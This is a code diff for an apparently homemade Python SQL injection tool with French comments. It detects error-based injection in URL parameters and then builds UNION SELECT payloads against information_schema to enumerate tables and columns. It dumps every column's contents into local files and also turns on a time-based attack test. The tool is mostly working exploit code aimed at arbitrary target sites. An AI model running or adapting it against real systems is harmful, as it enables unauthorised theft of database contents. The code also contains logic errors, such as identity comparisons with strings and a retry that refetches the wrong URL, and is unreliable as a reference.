@@ -40,10 +40,11 @@ def scan_page(url):
     original= None
     database = "Undefined"
     sqli = False
+    vulnerable = False
 
     for match in re.finditer(r"((\A|[?&])(?P<parameter>[^_]\w*)=)(?P<value>[^&#]+)", url):  
         sqli = True
-        print("* scanning '%s'" % ( match.group("parameter")))
+        print("*Vulnerable parameter :'%s'" % ( match.group("parameter")))
         original = _retrieve_content(url)  
         tampered = url + "\'\")("                 # URL avec generateur d'erreur
         content = _retrieve_content(tampered)     # html de page d'erreur
@@ -51,9 +52,10 @@ def scan_page(url):
 
         for dbms in DBMS_ERRORS:                    ##Cherche pour
             for regex in DBMS_ERRORS[dbms]:         ## un mot cle dans la page d'erreur
-                if re.search(regex, content, re.I) and not re.search(regex, original, re.I):
+                if re.search(regex, content, re.I) and not re.search(regex, original, re.I) and vulnerable == False:
                     print(Fore.RED + f"Parameter '{match.group('parameter')}' appears to be **ERROR** SQLi vulnerable")
                     database = dbms
+                    vulnerable=True
 	
     if not sqli:
         print("No SQLi found :(");
@@ -81,7 +83,7 @@ def test_time_attack(url):
 
 def open_url(url):
     response = requests.get(url)
-
+    
     if response.status_code == 200:
         soup = BeautifulSoup(response.content, 'html.parser')
         contenu_visible = soup.get_text()
@@ -94,15 +96,32 @@ def open_url(url):
 def search_for_str(url,chaine_recherchee):
     
     if open_url(url).find(chaine_recherchee) is not -1:
-        #print("This one:",url)
         return(True)
     else:
         return(False)
 
 
 def get_rep_explt(url,url_explt):
+    
+    basic = None
+    raw_tables = None
+    
     basic = open_url(url)
     raw_tables = open_url(url_explt)
+
+    if basic == None :
+        print("Last try for request")
+        basic = open_url(url)
+        if basic == None:
+            print("Echec")
+            sys.exit(1)
+
+    if raw_tables == None :
+        print("Last try for request")
+        raw_tables = open_url(url)
+        if raw_tables == None:
+            print("Echec")
+            sys.exit(1)
 
     output_list = [li for li in difflib.ndiff(basic, raw_tables) if li[0] != ' ']
 
@@ -110,21 +129,26 @@ def get_rep_explt(url,url_explt):
     return resultat
 
 
-
-def get_all(basic, info):
+def get_all(basic, info,archives):
 
     url_4table_name = info.replace("'qpTn'", "database()")
     dossier = get_rep_explt(basic,url_4table_name)
+    if archives != None:
+        if not os.path.exists(archives):
+            os.mkdir(archives)
+        dossier = archives+"/"+dossier
     if os.path.exists(dossier):
         print(Fore.RED + "Dir '", dossier, "' already exist, delete it")
         sys.exit(1)
     os.mkdir(dossier)
 
+    print(Fore.RED +"**UNION** exploit:")
+    print(Fore.WHITE + "-> Payload =", basic)
+    print()
 
     ext = "%20FROM%20information_schema.tables"
 
     url_4tables_explt = info.replace("'qpTn'", "group_concat(table_name)")+ ext
-
 
     resultat = get_rep_explt(basic,url_4tables_explt)
 
@@ -138,31 +162,33 @@ def get_all(basic, info):
         url_4columns_explt = info.replace("'qpTn'", "group_concat(column_name)") + ext 
         resultat = get_rep_explt(basic,url_4columns_explt)
         tableau_columns = resultat.split(',')
+
         for columns in tableau_columns:
             replacement = 'group_concat('+columns+')'
             ext = '%20FROM%20' + table
             url_4file_explt = info.replace("'qpTn'",replacement) + ext
-            #print (url_4file_explt)
             content = get_rep_explt(basic,url_4file_explt)
             if columns is not None or columns is not '':
                 file = table_dir+'/'+columns
                 print(file)
-                with open(file,'w') as fichier:
-                    fichier.write(content)
+                try:
+                    with open(file,'w') as fichier:
+                        fichier.write(content)
+                except:
+                    print("File empty")
 
         print("Scanning...")
 
-
-
     sys.exit(0)
 
-def search_tables(url):
+def search_tables(url, archives):
     null = "%20NULL"
     virgule = ","
     iteration = 0
 
+
     for match in re.finditer(r"((\A|[?&])(?P<parameter>[^_]\w*)=)(?P<value>[^&#]+)", url):
-        url_modifiee = re.sub(r"(\A|[?&])(?P<parameter>[^_]\w*)=([^&#]+)", r"\1\g<parameter>=" + "-626%20UNION%20SELECT", url)
+        url_modifiee = re.sub(r"(\A|[?&])(?P<parameter>[^_]\w*)=([^&#]+)", r"\1\g<parameter>=" + "-626%20UNION%20SELECT%20NULL", url)
         error = _retrieve_content(url_modifiee)
         test_error = error
 
@@ -171,48 +197,43 @@ def search_tables(url):
             if iteration > 25:
                 print("No exploit for get databases found")
                 sys.exit(1)
-            url_modifiee = url_modifiee + null
+            url_modifiee = url_modifiee +virgule+ null
             test_error =  _retrieve_content(url_modifiee)
-            url_modifiee = url_modifiee + virgule
-        url_exploit=url_modifiee[:-1]
+        url_exploit=url_modifiee
         
         chaine = url_exploit
         motif = "NULL"
         remplacement = "'qpTn'"
 
-
-        occurrences = chaine.count(motif)
         index = 0
 
         while True:
             index = chaine.find(motif, index)
             if index == -1:
+                print("Error")
                 break
             chaine = chaine[:index] + remplacement + chaine[index + len(motif):]
            
             if search_for_str(chaine,'qpTn'):
-                get_all(url_exploit,chaine)
-           
+                get_all(url_exploit,chaine,archives)
+                
             chaine = chaine[:index] + motif + chaine[index + len(remplacement):]
             index += len(remplacement)
 
-
-
-    
 
 
 if __name__ == "__main__":
 
     parser = optparse.OptionParser()
     parser.add_option("-u", "--url", dest="url", help="Target URL (e.g. \"http://www.target.com/page.php?id=1\")")
+    parser.add_option("-o",  dest="archive", help="Archive dir (e.g. \"./data"")")
+    parser.add_option("-X", dest="request_type", help="Request type (e.g. \"POST\")")
     options, _ = parser.parse_args()
 
     print(Fore.WHITE+"*------------------------------------------------------------------------*")
 
     database=scan_page(options.url if options.url.startswith("http") else "http://%s" % options.url)
-    #test_time_attack(options.url)
-
-    print(Fore.WHITE+"*------------------------------------------------------------------------*")
+    test_time_attack(options.url)
 
     if database is not "Undefined":
-        search_tables(options.url if options.url.startswith("http") else "http://%s" % options.url)
+        search_tables(options.url if options.url.startswith("http") else "http://%s" % options.url, options.archive )
